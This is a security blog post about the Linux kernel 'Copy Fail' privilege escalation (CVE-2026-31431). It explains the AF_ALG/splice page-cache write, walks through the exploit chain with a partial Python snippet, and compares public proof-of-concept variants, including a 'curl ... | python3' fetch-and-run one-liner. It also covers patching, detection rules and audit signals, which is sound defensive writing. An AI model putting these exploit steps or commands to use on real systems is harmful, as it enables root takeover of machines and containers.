---
title: "732 Bytes to Root: Copy Fail Just Broke Every Linux Distro Since 2017"
description: "CVE-2026-31431 is a logic bug in the Linux kernel's crypto API that gives any local user root through a 732-byte Python script. No race conditions, no kernel offsets, no recompilation. Same script, every distro, every time. It's been sitting there for nine years."
date: "2026-04-30"
tags: ["linux", "kernel", "lpe", "privilege-escalation", "af-alg", "cve-2026-31431", "page-cache", "container-escape"]
---

On April 29, 2026, Theori's Xint Code research team publicly disclosed CVE-2026-31431, a local privilege escalation in the Linux kernel they're calling "Copy Fail." The proof-of-concept is a 732-byte Python script that gives you root. It works unmodified on Ubuntu, Amazon Linux, RHEL, and SUSE. No race conditions to win. No per-distro offsets to calculate. No compiled payloads to stage. Run it, get root.

The Linux kernel has had page-cache privilege escalation bugs before. Dirty Cow (CVE-2016-5195) required winning a race condition and sometimes crashed the system. Dirty Pipe (CVE-2022-0847) was version-specific and needed precise pipe buffer manipulation. Copy Fail is a straight-line logic flaw. It follows a linear code path with zero timing dependencies. That's what makes it different from everything that came before it.

CVSS 7.8. Exploitable since the in-place optimization landed in 2017. Fixed in mainline on April 1, 2026 (commit `a664bf3d603d`), with stable backports rolling out across distributions. That window covers essentially every major Linux distribution shipped in the last nine years.

## What Is It

Copy Fail is a logic flaw at the intersection of three kernel subsystems that were never designed to interact the way they do. Each one is fine on its own. Together, they hand any unprivileged user a controlled write primitive into the page cache of any readable file on the system.

- **Severity**: CVSS 7.8 (High)
- **Affected**: Every mainline Linux kernel since the 2017 in-place optimization (`72548b093ee3`) up to the April 2026 fix
- **Impact**: Local privilege escalation to root. Container escape primitive (per Theori).
- **Mechanism**: Page cache corruption via AF_ALG socket + splice() + authencesn AEAD scratch write
- **Disclosure**: April 29, 2026 by Theori (researcher Taeyang Lee, scaled with their Xint Code AI tool)
- **Patched**: Mainline commit `a664bf3d603d` (April 1, 2026); stable backports landing across distributions

## How It Works

Three components. Each one has been in the kernel for years. The combination is what kills you.

### AF_ALG

AF_ALG is a socket type that exposes the kernel's crypto subsystem to unprivileged userspace. Any user can open one, bind to an AEAD template, and invoke encryption or decryption. No privileges required. Enabled by default on essentially every mainstream distro.

### splice()

`splice()` transfers data between file descriptors and pipes without copying, passing page cache pages by reference. When you splice a file into a pipe and then into an AF_ALG socket, the socket's input scatterlist holds direct references to the kernel's cached pages of that file. Not copies. The actual physical pages that back every `read()`, `mmap()`, and `execve()` of that file system-wide.

### authencesn

`authencesn` is an AEAD wrapper used by IPsec for Extended Sequence Number support. It needs to rearrange ESN bytes for HMAC computation, and it does this by using the caller's destination buffer as scratch space. It writes 4 bytes at offset `assoclen + cryptlen`, past the AEAD tag boundary. No other standard AEAD algorithm in the kernel does this. GCM, CCM, and regular `authenc` all stay within the legitimate output area. `authencesn` alone writes past it.

### The 2017 Optimization That Made It Exploitable

In 2017, commit `72548b093ee3` added in-place AEAD operation to `algif_aead.c`, setting `req->src = req->dst`. Before this, source and destination were separate scatterlists. Page cache pages went into `src` (read-only), and `authencesn`'s scratch write hit `dst` (the user's buffer). Not exploitable.

After the optimization, the output scatterlist contained chained references to page cache pages from `splice()`. When `authencesn` performed its scratch write past the tag boundary, it walked into those chained pages and wrote 4 attacker-controlled bytes directly into the kernel's cached copy of the target file.

The attacker controls three things:

1. **Which file** -- any file readable by the current user
2. **Which offset** -- determined by splice offset, splice length, and assoclen
3. **What value** -- bytes 4-7 of the AAD, set by the attacker in `sendmsg()`

That's a controlled, deterministic page-cache write primitive. No races. No retries. No guessing.

## The Exploit Chain

The default PoC targets `/usr/bin/su`, a setuid-root binary present on every tested distro.

**Step 1: Socket setup.** Open an AF_ALG socket, bind to `authencesn(hmac(sha256),cbc(aes))`, set a key, accept a request socket. All unprivileged.

**Step 2: Construct the write.** For each 4-byte chunk of shellcode, build a `sendmsg()` + `splice()` pair. The `sendmsg` AAD carries the bytes to write. The `splice` provides the target file's page cache pages. AEAD parameters are chosen so the scratch write lands at the target offset in `/usr/bin/su`'s `.text` section.

**Step 3: Trigger.** `recv()` fires the decrypt. Inside `authencesn`, the kernel writes `seqno_lo` past the tag boundary into the chained page cache page. HMAC check fails, `recvmsg()` returns an error. The page cache corruption persists.

**Step 4: Execute.** `execve("/usr/bin/su")`. The kernel loads the binary from the page cache. The page cache version contains injected shellcode. `su` is setuid-root. Shellcode runs as UID 0. Root.

```python
a = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
# ... set key, accept request socket u ...
u.sendmsg([b"A"*4 + payload_chunk], [cmsg_headers], MSG_MORE)
os.splice(target_fd, pipe_wr, offset)
os.splice(pipe_rd, alg_fd, offset)
u.recv(...)  # triggers decrypt -> page cache write
```

The entire exploit uses Python 3.10+ standard library only. `os`, `socket`, `zlib`. No compiled payloads. No dependencies.

## Why It's Stealthy

The write bypasses the ordinary VFS write path entirely. The corrupted page is never marked dirty by the kernel's writeback machinery, so the file on disk stays unchanged. File integrity monitoring tools that compare on-disk checksums will miss it completely.

But the page cache is what actually gets read when anything accesses the file. The corrupted in-memory version is immediately visible to every process on the system. The modification survives until the page gets evicted from cache or the system reboots.

This also means standard forensic approaches focused on disk analysis won't catch it. You need page-cache-aware detection.

## Testing It

Before running anything destructive, use the non-destructive detector from [rootsecdev's toolkit](https://github.com/rootsecdev/cve_2026_31431). The `test_cve_2026_31431.py` script creates a temp file, attempts the page cache write against it, and checks if the marker landed. It never touches `/usr/bin/su`, `/etc/passwd`, or any system file. Exit code 2 means vulnerable. Exit code 0 means patched or AF_ALG unavailable.

```bash
python3 test_cve_2026_31431.py
# exit 0 = not vulnerable, 2 = vulnerable, 1 = test error
```

I tested Copy Fail on Kali Linux ARM64 running in UTM on Apple Silicon. Kernel `6.18.12+kali-arm64` -- pre-fix, AF_ALG present, both the rootsecdev and Bad Sector Labs PoCs root the box without modification. Multiple Hacker News users have also confirmed it pops root on stock Ubuntu 24.04 LTS as of disclosure day, since Canonical hasn't shipped the fix to pre-26.04 releases yet.

The detector confirms the vulnerability without touching any system file, then the rootsecdev exploit corrupts the `/etc/passwd` page cache and prompts for `sam`'s own password:

![Detector confirms VULNERABLE on Kali ARM64, then exploit patches /etc/passwd page cache and prompts for password](/screenshots/01-copy-fail-detector-and-exploit.png)
*Detector marks the kernel as VULNERABLE. The exploit then patches sam's UID field from `1000` to `0000` in the page cache. `getpwnam('sam').pw_uid = 0` confirms the corruption is live. After typing sam's own password, the prompt drops to `(root@larp)`.*

Once you're in the root shell, the smoking gun is what `id` reports:

![Inside root shell: uname -r shows 6.18.12+kali-arm64, uname -m shows aarch64, id shows uid=0(root) gid=1000(sam) with sam's supplementary groups](/screenshots/02-copy-fail-root-shell-proof.png)
*`uid=0(root)` but `gid=1000(sam)` -- and every supplementary group still belongs to sam (`sudo`, `wireshark`, `kaboxer`, etc.). A real `su` would have switched the primary group and dropped sam's supplementary groups. This mismatch is the runtime fingerprint of page-cache UID corruption.*

The script runs in under a second. No output, no errors, no drama. Just a root shell with sam's group identity stapled to root's UID.

### The ARM64 Caveat

If you're running this on Apple Silicon: Theori's original `curl https://copy.fail/exp | python3 && su` ships x86-64 shellcode only. On ARM64 it splices that x86-64 payload into `/usr/bin/su`'s page cache at offsets meant for amd64 binaries, corrupting the ARM64 ELF header and producing `sh: 1: su: Exec format error`. The page cache write primitive still works (the kernel doesn't care about your arch), but the injected shellcode is architecture-specific.

Worse, that corruption persists in page cache across exploit attempts. If you run Theori's PoC on ARM64 first and then try the rootsecdev variant, rootsecdev's `/etc/passwd` patch will succeed but the subsequent `execvp("su", ...)` will hit the still-corrupted `/usr/bin/su` page and fail with the same `Exec format error`. Reboot to flush page cache, then run only the rootsecdev exploit.

### PoC Variants

Four public implementations exist, each with a different angle.

**[theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431) -- the original, Python**

732 bytes. Python 3.10+ standard library only. Injects x86-64 shellcode into `/usr/bin/su`'s page cache, then calls `execve("/usr/bin/su")` to run it as root. Targets the four distros Theori tested. Fails on aarch64 with `Exec format error` because the shellcode is x86-64 only.

**[rootsecdev/cve_2026_31431](https://github.com/rootsecdev/cve_2026_31431) -- Python, no shellcode**

The variant most worth understanding. Instead of injecting shellcode into a setuid binary, it corrupts the page cache copy of `/etc/passwd`, changing the running user's UID field from (e.g.) `1000` to `0000`. Then it calls `su` with the user's own password. PAM authenticates against `/etc/shadow` (untouched), but when it calls `setuid(getpwnam(user).pw_uid)`, libc reads UID 0 from the corrupted page cache. Root.

Two operational wins over Theori's: it ships a non-destructive detector (`test_cve_2026_31431.py`) that proves vulnerability against a temp file without touching system binaries, and the revert is one command -- `posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED)` evicts the corrupted page, or just reboot. The on-disk `/etc/passwd` was never modified. Architecture-agnostic since there's no shellcode involved.

**[badsectorlabs/copyfail-go](https://github.com/badsectorlabs/copyfail-go) -- Go static binary**

Same `/usr/bin/su` injection approach as Theori but ships native shellcode for both x86-64 and AArch64, picking the right one at runtime. No Python dependency on target. This is the variant that's most useful in a real post-exploitation scenario where you've got a shell as `www-data` and don't want to ship an interpreter. On the same Kali ARM64 VM:

![Go variant rooting Kali ARM64: writes 172 bytes into /usr/bin/su page cache, executes payload, drops directly to a root shell. id shows uid=0(root) gid=1000(sam) groups=1000(sam) -- the same mixed-identity fingerprint the Python /etc/passwd variant produces](/screenshots/04-copy-fail-go-variant-rooted.png)
*Statically-linked ARM64 binary. 172 bytes total written into `/usr/bin/su`'s page cache across three progress reports (cumulative byte counts shown), then `execve("/usr/bin/su")` runs the injected shellcode and drops a root shell. No Python interpreter needed on target. The id output -- `uid=0(root) gid=1000(sam) groups=1000(sam),4(adm),20(dialout)...` -- shows the same mixed-identity fingerprint that the rootsecdev `/etc/passwd` variant produces, even though this PoC corrupts a completely different file with completely different bytes.*

That mixed-UID-with-original-supplementary-groups state is now confirmed across two independent PoCs targeting two different files. It's a class-level fingerprint, not a one-PoC quirk. We come back to that in the Detection section.

**[tgies/copy-fail-c](https://github.com/tgies/copy-fail-c) -- minimal C**

Plain C reimplementation of the same primitive. Useful if you want to read the shortest possible expression of the bug or build it into something with no language runtime at all. Functionally similar to Theori's PoC.

## Who Should Be Panicking

### Multi-Tenant Servers and Shared Hosting

Any local user becomes root. One compromised tenant owns the entire box and every other tenant's data. If you run shared hosting on unpatched Linux, every customer's data is exposed to every other customer right now.

### Kubernetes and Container Environments

The page cache is shared across all processes on a host, including across container boundaries. A write from one container affects the host page cache and every other pod on that node. Theori claims this is a container escape primitive and says Part 2 of their writeup will demonstrate it on major cloud Kubernetes platforms. The technical basis is sound since shared page cache is a well-understood kernel property, but the full container escape chain hasn't been published yet.

One exception: the exploit does not escape rootless Podman containers. A Hacker News user tested this directly. User namespaces appear to block the escalation path, though the underlying page cache corruption may still occur.

### CI Runners and Build Farms

Self-hosted GitHub Actions runners, GitLab runners, Jenkins agents. Anything that executes untrusted PR code as a regular user on a shared kernel. A malicious pull request becomes root on the runner.

### Web RCE Chains

This is where it gets ugly for anyone doing web security. Any web application RCE that drops you to a shell as `www-data` or some other unprivileged service account can now be trivially escalated to root. Copy Fail turns every web shell into full system compromise.

## What Doesn't Work

The exploit has edge cases that the marketing copy glosses over.

**Alpine Linux.** The exploit doesn't work on Alpine. A Hacker News user tested it directly, even after fixing the `su` path from `/usr/bin/su` to `/bin/su`. The script runs but nothing happens. Likely related to musl libc differences and Alpine's approach to setuid binaries.

**ARM64 with Theori's specific PoC.** Theori's public PoC ships x86-64 shellcode only. Running it on aarch64 (e.g., Kali ARM64 on Apple Silicon) corrupts `/usr/bin/su` with the wrong arch's shellcode at the wrong offsets, producing `Exec format error`. This is not an ARM64 limitation of the bug -- the rootsecdev variant works fine on ARM64 (no shellcode needed) and the Bad Sector Labs Go variant ships native AArch64 shellcode and roots the same VM directly. The bug is fully exploitable on ARM64. Theori's PoC just isn't.

**1-3 digit UIDs.** The exploit as written requires the running user to have a 4-digit UID (1000-9999). Users with shorter UIDs need multi-shot writes. The PoC doesn't handle this automatically.

**NSS caching.** If `nscd`, `sssd`, or `systemd-userdbd` is running and caching `/etc/passwd` reads, the page cache corruption may not be visible to `getpwnam()` until the cache is bypassed or restarted.

**"Every distro since 2017."** Theori tested four distributions: Ubuntu 24.04 LTS, Amazon Linux 2023, RHEL 10.1, and SUSE 16. The "every distro" claim is based on the affected kernel version range (the 2017 in-place optimization onward), not exhaustive testing. The underlying vulnerability almost certainly exists on other distros running affected kernels, but "every" is doing a lot of heavy lifting for four data points.

## Remediation

**Patch the kernel.** The fix (commit `a664bf3d603d`) reverts `algif_aead.c` to out-of-place operation, removing the 2017 in-place optimization entirely. Page cache pages can no longer end up in the writable destination scatterlist. Most major distributions should be shipping this through normal kernel updates.

**If you can't patch immediately**, disable the `algif_aead` module:

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

This kills the attack surface completely. AF_ALG is a userspace interface to kernel crypto that almost nothing in production actually uses. LUKS, SSH, OpenSSL, IPsec -- they all call kernel crypto directly or use userspace libraries. Disabling AF_ALG has zero impact on typical workloads unless you've explicitly configured something like OpenSSL's `afalg` engine.

**For container environments**, block AF_ALG socket creation via seccomp regardless of patch state. Don't wait for the kernel update.

**Check your distro's tracker:**

- [Debian CVE Tracker](https://security-tracker.debian.org/tracker/CVE-2026-31431)
- [Ubuntu CVE Tracker](https://ubuntu.com/security/CVE-2026-31431)
- [Red Hat CVE Page](https://access.redhat.com/security/cve/cve-2026-31431)

As of publication, most major distributions are shipping the fix or staging it. Ubuntu 26.04 (Resolute) and later are unaffected; pre-26.04 LTS releases are still receiving backports. Red Hat initially classified this as "Moderate severity" with "Fix deferred" -- a questionable call given a public PoC with 100% reliability across their own distro -- and reversed course shortly after, falling in line with other distros to patch promptly.

## Detection

Florian Roth (the person behind THOR and the signature-base YARA repo) published a [YARA rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_copy_fail_cve_2026_31431.yar) for Copy Fail on the same day as public disclosure. The rule (`EXPL_LNX_Copy_Fail_Artefacts_CVE_2026_31431_Apr26`) targets artifacts from the public PoCs Roth had on hand when he wrote it:

- **Theori's original Python PoC** -- string matches on the `authencesn(hmac(sha256),cbc(aes))` bind, the `g.open("/usr/bin/su",0)` file open, and the `curl https://copy.fail/exp | python3 && su` one-liner that people are copying from the landing page
- **Bad Sector Labs' Go port** -- hex matches on the compressed ELF payloads embedded in `main.go`
- **Raw shellcode bytes** -- hex sequences for the tiny `setuid(0)` + `execve("/bin/sh")` + `exit(0)` ELF payloads in both x86-64 and AArch64

The rule's metadata also references tgies' C port and q3k's Alpine variant, but those are listed for context. The actual matching strings are tied to Theori's Python and the Go binary's payloads.

The rule triggers on any single `$x*` match (code fragments, URLs, status messages) or the combination of both `$s*` strings (the hex-encoded AEAD parameters and the `authencesn` bind string). Score is 75, which in Roth's scoring system means "suspicious, likely malicious."

If you're running YARA scans on hosts, CI artifacts, or container images, pull the latest signature-base and add this to your ruleset. It won't catch exploitation in progress (the exploit runs in memory through kernel syscalls), but it will catch the PoC scripts, compiled exploit binaries, and download artifacts sitting on disk. That covers the most likely scenario: someone downloads the PoC, runs it, and leaves the script behind.

### Where Roth's Rule Holds and Where It Breaks

I tested the rule against three of the four publicly available PoC variants:

![YARA scan: matches on Theori's original PoC, silent on rootsecdev's reimplementation, matches on Bad Sector Labs' Go port](/screenshots/03-copy-fail-yara-detection-matrix.png)
*Three commands. Theori's PoC fetched from copy.fail matches `EXPL_LNX_Copy_Fail_Artefacts_CVE_2026_31431_Apr26`. The rootsecdev clone returns silence. The Bad Sector Labs Go port matches on `main.go`.*

**theori-io/copy-fail-CVE-2026-31431 -- match.** `$x2` hits on `g.open("/usr/bin/su",0);i=0;`. Original target of the rule.

**badsectorlabs/copyfail-go -- match.** `$xg*` hits on the hex-encoded zlib-compressed shellcode payloads embedded in `main.go`.

**rootsecdev/cve_2026_31431 -- no match.** Independent reimplementation. Targets `/etc/passwd` not `/usr/bin/su`. Different log strings. No embedded shellcode. None of the rule's literal strings appear.

This is the limit of signature-based detection on a class of bug where the underlying primitive is small enough that anyone can reimplement it in an hour. Roth wrote the rule against the artifacts he had. The rootsecdev variant -- published the same week, same primitive, independent code -- slips past entirely. The next variant someone writes will probably slip past too. The shellcode-byte signatures buy you some coverage against payload reuse, but a `/etc/passwd` UID-corruption variant doesn't need shellcode.

Run the rule. Pull updates. Just don't trust it as your only line.

### Runtime Detection That Actually Generalizes

Two runtime signals catch all variants regardless of their source code.

**Mixed UID/GID identity.** Every Copy Fail variant tested leaves the same process-state fingerprint, regardless of which file it corrupts: the post-exploit shell has `uid=0` but retains the supplementary group set of the original unprivileged user. The rootsecdev `/etc/passwd` variant produces it (screenshot 2). The Bad Sector Labs Go variant injecting shellcode into `/usr/bin/su` produces it (screenshot 4). Two PoCs, two different target files, two different mechanisms, identical signature: `uid=0(root) gid=1000(sam) groups=1000(sam),4(adm),20(dialout),...`.

A legitimate `su` switches both the primary GID and the supplementary groups via `initgroups()`. Copy Fail can't. The `/etc/passwd` variant changes only the UID field returned by `getpwnam()`; the GID and group list still belong to whatever user invoked `su`. The shellcode-injection variant runs `setuid(0)` directly from the injected payload, which changes UID but leaves the rest of the process identity intact. Both paths converge on the same broken state because both bypass the part of `su` that actually fixes up groups.

`uid=0` with non-root supplementary groups is not a state any well-formed privilege escalation produces. Any monitoring that compares effective UID against the supplementary group set catches every Copy Fail variant tested so far, and probably every variant that anyone writes next, because there's no obvious way to fix this from inside the exploit without doing what `su` already does.

**AF_ALG socket creation.** The other runtime signal catches the primitive itself, not any specific PoC. Audit rules on AF_ALG socket creation fire regardless of what userspace code is doing the exploitation:

```bash
# Audit AF_ALG socket creation (socket family 38)
auditctl -a always,exit -F arch=b64 -S socket -F a0=38 -k copy_fail_detect
```

Almost nothing legitimate creates AF_ALG sockets in normal production workloads, so this should be a low-noise alert.

## The AI Angle

Copy Fail was found by Xint Code, Theori's AI-powered security research tool. Theori says it took one operator prompt and about an hour of scan time against the Linux `crypto/` subsystem. The operator prompt was straightforward: examine all codepaths reachable from userspace syscalls, noting that `splice()` can deliver page-cache references of read-only files to crypto TX scatterlists.

Theori isn't some nobody. Their CTF team, The Duck, is one third of Maple Mallard Magistrates -- the supergroup with CMU's Plaid Parliament of Pwning and UBC's Maple Bacon that has won DEF CON CTF nine times. Their AI cyber reasoning system "Robo Duck" took third place in DARPA's AI Cyber Challenge finals last year for $1.5M. When they say their tool found this in an hour, that claim carries weight.

The same scan also found other high-severity vulnerabilities still in responsible disclosure.

This matters beyond the individual bug. If AI tooling can surface nine-year-old kernel logic flaws in an hour of compute time, the assumption that kernel-grade LPEs are rare because they're expensive to find is no longer valid. Bug bounty programs, vulnerability budgets, and threat models that price kernel zero-days as rare events need to update that assumption. The cost of finding deep logic flaws just dropped by roughly an order of magnitude.

The Internet Bug Bounty program has already suspended awards while they figure out how to handle the volume of AI-assisted submissions. This is the beginning of that wave, not the end of it.

## Disclosure Timeline

- **2026-03-23** -- Reported to Linux kernel security team
- **2026-03-24** -- Initial acknowledgment
- **2026-03-25** -- Patches proposed and reviewed
- **2026-04-01** -- Patch committed to mainline
- **2026-04-22** -- CVE-2026-31431 assigned
- **2026-04-29** -- Public disclosure

Reported, acknowledged, patched, then published. 37 days from report to public disclosure with a mainline fix in place. Responsible disclosure done right.

## References

**Primary Sources:**

- [Theori/Xint Writeup](https://xint.io/blog/copy-fail-linux-distributions) -- full technical analysis from the researchers who found it
- [copy.fail](https://copy.fail/) -- landing page with PoC, demo, and FAQ

**Kernel Patches:**

- [Mainline fix (a664bf3d603d)](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [CVE announcement on linux-cve-announce](https://lore.kernel.org/linux-cve-announce/2026042214-CVE-2026-31431-3d65@gregkh/T/#u)
- [oss-security mailing list](https://seclists.org/oss-sec/2026/q2/281)

**Detection:**

- [Florian Roth's YARA Rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_copy_fail_cve_2026_31431.yar) -- signature-base detection for all public PoC variants

**Exploit Variants:**

- [theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431) -- original 732-byte Python PoC
- [rootsecdev/cve_2026_31431](https://github.com/rootsecdev/cve_2026_31431) -- Python toolkit with non-destructive detector and /etc/passwd LPE variant
- [badsectorlabs/copyfail-go](https://github.com/badsectorlabs/copyfail-go) -- Go static binary implementation
- [tgies/copy-fail-c](https://github.com/tgies/copy-fail-c) -- C implementation

**Analysis:**

- [Bugcrowd: What We Know About Copy Fail](https://www.bugcrowd.com/blog/what-we-know-about-copy-fail-cve-2026-31431/)
- [The Register: Linux Cryptographic Code Flaw](https://www.theregister.com/2026/04/30/linux_cryptographic_code_flaw)
- [Hacker News Discussion](https://news.ycombinator.com/item?id=47952181)

732 bytes. Nine years undetected. Every major distro. Found by AI in an hour.

Patch your kernel.
